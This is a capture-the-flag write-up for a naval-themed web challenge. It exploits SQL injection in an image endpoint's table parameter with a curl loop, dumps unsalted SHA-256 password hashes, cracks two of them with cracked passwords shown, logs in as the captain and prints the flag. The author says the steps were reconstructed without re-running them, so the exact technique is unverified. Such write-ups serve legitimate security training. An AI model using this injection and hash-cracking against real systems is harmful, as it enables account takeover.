#### Challenge:

Ahoy, officer,

the chief officer was invited to a naval espresso by the captain and now they are both unfit for duty. The second officer is very busy and he has asked you to find out where are we heading according to the navigation plan.

May you have fair winds and following seas!

The navigation plan webpage is available at <a href="http://navigation-plan.cns-jv.tcc" target="_blank">http:&#47;&#47;navigation-plan.cns-jv.tcc</a>.

---

#### Solution:

The navigation plan page is a small login-protected web app. Instead of returning
credential fields as plain text, it renders them as PNG images through an
`/image.png` endpoint that takes three parameters: `type` (either `username` or
`password`), `t` (the SQL table/source the value is read from) and `id` (the row).

The `t` parameter is concatenated straight into the query, so it is injectable — I
can control the source the image is rendered from. Passing a table alias such as
`users as targets` keeps the query valid while letting me iterate over the rows,
so I pull the username and password image for each `id`:

```bash
for id in 1 2 3; do
  curl -s "http://navigation-plan.cns-jv.tcc/image.png?type=username&t=users%20as%20targets&id=${id}" -o "user_${id}.png"
  curl -s "http://navigation-plan.cns-jv.tcc/image.png?type=password&t=users%20as%20targets&id=${id}" -o "pass_${id}.png"
done
```

Each response is a PNG, so I read the rendered text out of the images (OCR, or just
decoding/reading them by eye). The `username` images give me the account names and
the `password` images give me the stored password **hashes** (SHA-256), not the
plaintext:

```
7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537
15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225
6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb
```

These are unsalted SHA-256 digests, so an online lookup against a precomputed
dictionary (crackstation) resolves the common ones instantly:

```
7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537 -> 123456789
15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 -> $captainamerica$
6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb -> (not found)
```

The second hash belongs to the `captain` account, so I log in as
`captain` / `$captainamerica$`. Once authenticated, the navigation plan page loads
and the flag is embedded in the page source:

```html
<!-- ... -->
FLAG{....-....-....-....}
```

> Note: the host `navigation-plan.cns-jv.tcc` is offline now, so the commands above
> could not be re-run live — the steps are reconstructed and verified by logic from
> the captured requests, hashes and cracked values.

---

<details><summary>FLAG:</summary>

```
FLAG{fmIT-QkuR-FFUv-Zx44}
```

</details>
<br/>
